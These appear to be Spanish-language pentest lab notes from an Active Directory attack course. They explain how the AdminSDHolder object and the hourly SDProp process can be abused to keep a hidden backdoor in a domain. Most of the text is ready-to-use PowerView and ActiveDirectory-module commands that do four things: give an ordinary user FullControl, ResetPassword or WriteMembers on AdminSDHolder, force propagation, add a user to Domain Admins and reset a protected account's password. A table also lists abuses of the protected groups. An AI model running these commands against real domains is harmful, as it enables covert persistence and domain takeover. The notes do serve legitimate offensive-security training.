# AdminSDHolder using ACLs 

Tags: #AD #Windows #Powershell #ACL 

```bash 
- Se encuentra en el contenedor 'System' de un dominio y se utiliza para controlar los permisos — mediante una ACL — de ciertos grupos privilegiados integrados (llamados 'Protected Groups').
  
- El 'Security Descriptor Propagator (SDPROP)' se ejecuta cada hora y compara la ACL de los grupos protegidos y sus miembros con la ACL de 'AdminSDHolder'; cualquier diferencia es sobrescrita en la ACL del objeto.
```

Grupos protegidos:

| Grupo             | Grupo                        |
| ----------------- | ---------------------------- |
| Account Operators | Enterprise Admins            |
| Backup Operators  | Domain Controllers           |
| Server Operators  | Read-only Domain Controllers |
| Print Operators   | Schema Admins                |
| Domain Admins     | Administrators               |
| Replicator        |                              |

Abusos conocidos de algunos grupos protegidos:

| Grupo             | Abuso                                                                                                         |
| ----------------- | ------------------------------------------------------------------------------------------------------------- |
| Account Operators | No pueden modificar grupos DA/EA/BA, pero pueden modificar grupos anidados dentro de ellos                    |
| Backup Operators  | Respaldar GPO, modificarlo para agregar el SID de una cuenta controlada a un grupo privilegiado y restaurarlo |
| Server Operators  | Ejecutar comandos como SYSTEM (usando el servicio Browser deshabilitado)                                      |
| Print Operators   | Copiar respaldo de `ntds.dit`, cargar drivers de dispositivo                                                  |

```bash 
- Con privilegios de 'Domain Admin (DA)' (Full Control / permisos de escritura) sobre el objeto 'AdminSDHolder', este puede usarse como un mecanismo de 'backdoor/persistencia' agregando un usuario con 'Full Permissions' (u otros permisos interesantes) al objeto AdminSDHolder.
  
- En 60 minutos (cuando se ejecuta 'SDPROP'), el usuario recibirá 'Full Control' en la ACL de grupos como 'Domain Admins', sin necesidad de ser miembro directo de dichos grupos.
```

## Comandos 

```powershell 
! Usuario: Domain Admin

❯ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
# Agregar permisos FullControl sobre el AdminSDHolder al usuario normal del dominio vía PowerView — tras el siguiente ciclo de SDProp (~60 min), el permiso se propaga a todos los objetos protegidos del dominio.

❯ Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
# Agregar permisos GenericAll sobre el AdminSDHolder usando el módulo ActiveDirectory + RACE toolkit — alternativa a PowerView para el mismo objetivo.

❯ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
# Agregar permiso ResetPassword sobre el AdminSDHolder a student1 — permite resetear contraseñas de cuentas protegidas tras la propagación de SDProp.

❯ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
# Agregar permiso WriteMembers sobre el AdminSDHolder al usuario normal del dominio — permite modificar la membresía de grupos protegidos tras la propagación de SDProp.
```

```powershell 
! Usuario: Domain Admin

❯ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
# Ejecutar SDProp manualmente para forzar la propagación inmediata de permisos del AdminSDHolder a todos los objetos protegidos — sin esperar el ciclo automático de ~60 min.

❯ Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
# Igual que el anterior pero para máquinas pre-Server 2008 — usa la tarea FixUpInheritance en lugar del mecanismo estándar.
```

```powershell 
! Usuario: Usuario de dominio normal

❯ Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
# Verificar si student1 tiene permisos sobre el grupo Domain Admins vía PowerView — confirma que la propagación de SDProp fue exitosa.

❯ (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
# Verificar los mismos permisos usando el módulo ActiveDirectory nativo — alternativa a PowerView para confirmar la propagación.
```

```powershell 
! Usuario: Usuario de dominio normal (con permisos FullControl sobre Domain Admins via AdminSDHolder)

❯ Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
# Agregar el usuario testda al grupo Domain Admins abusando del permiso FullControl obtenido vía AdminSDHolder — usando PowerView.

❯ Add-ADGroupMember -Identity 'Domain Admins' -Members testda
# Igual que el anterior pero usando el módulo ActiveDirectory nativo.
```

```powershell 
! Usuario: Usuario de dominio normal (con permiso ResetPassword sobre Domain Admins via AdminSDHolder)

❯ Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
# Resetear la contraseña de testda abusando del permiso ResetPassword obtenido vía AdminSDHolder — usando PowerView.

❯ Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
# Igual que el anterior pero usando el módulo ActiveDirectory nativo.
```